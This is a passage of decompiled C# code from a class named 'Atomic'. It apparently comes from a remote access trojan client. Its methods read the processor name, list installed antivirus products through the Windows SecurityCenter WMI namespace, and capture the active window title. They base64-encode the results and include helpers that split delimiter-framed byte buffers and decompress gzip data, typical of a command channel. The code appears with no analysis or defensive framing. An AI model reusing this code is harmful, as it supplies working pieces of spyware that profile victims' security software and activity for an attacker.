            str = Conversions.ToString(Convert.ToInt32(RuntimeHelpers.GetObjectValue(enumerator.Current["AddressWidth"])));
        }
        finally
        {
          enumerator?.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "????";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public string GetProduct(string Product)
    {
      string product;
      try
      {
        string empty = string.Empty;
        try
        {
          foreach (ManagementObject managementObject in new ManagementObjectSearcher("root\\SecurityCenter" + Interaction.IIf(Atomic.DI.OSFullName.Contains("XP"), (object) "", (object) "2").ToString(), Product).Get())
            empty += managementObject["displayName"].ToString();
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
        product = Operators.CompareString(empty, string.Empty, false) == 0 ? Conversions.ToString(this.Encode("N/A")) : Conversions.ToString(this.Encode(empty));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        product = Conversions.ToString(this.Encode("N/A"));
        ProjectData.ClearProjectError();
      }
      return product;
    }

    public object MP()
    {
      object obj;
      try
      {
        obj = (object) Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENTRALPROCESSOR\\0", "ProcessorNameString", (object) null).ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "????";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public string GAW()
    {
      StringBuilder lpString = new StringBuilder(256);
      Atomic.GetWindowText(Atomic.GFW(), lpString, lpString.Capacity);
      return Conversions.ToString(this.Encode(lpString.ToString()));
    }

    public byte[] SB(string s) => Encoding.Default.GetBytes(s);

    public string BS(byte[] b) => Encoding.Default.GetString(b);

    public Array fx(byte[] b, string WRD)
    {
      List<byte[]> numArrayList = new List<byte[]>();
      MemoryStream memoryStream1 = new MemoryStream();
      MemoryStream memoryStream2 = new MemoryStream();
      string[] strArray = Strings.Split(this.BS(b), WRD);
      memoryStream1.Write(b, 0, strArray[0].Length);
      memoryStream2.Write(b, checked (strArray[0].Length + WRD.Length), checked (b.Length - strArray[0].Length + WRD.Length));
      numArrayList.Add(memoryStream1.ToArray());
      numArrayList.Add(memoryStream2.ToArray());
      memoryStream1.Dispose();
      memoryStream2.Dispose();
      return (Array) numArrayList.ToArray();
    }

    public byte[] Decompress(byte[] data)
    {
      MemoryStream memoryStream1 = new MemoryStream();
      memoryStream1.Write(data, 0, data.Length);
      memoryStream1.Position = 0L;
      GZipStream gzipStream = new GZipStream((Stream) memoryStream1, CompressionMode.Decompress, true);
      MemoryStream memoryStream2 = new MemoryStream();
      byte[] numArray = new byte[64];
      for (int count = gzipStream.Read(numArray, 0, numArray.Length); count > 0; count = gzipStream.Read(numArray, 0, numArray.Length))
        memoryStream2.Write(numArray, 0, count);
      gzipStream.Close();
      return memoryStream2.ToArray();
    }

    public object Encode(string Input) => (object) Convert.ToBase64String(Encoding.UTF8.GetBytes(Input));

    public object Decode(string Input) => (object) Encoding.UTF8.GetString(Convert.FromBase64String(Input));
  }
}
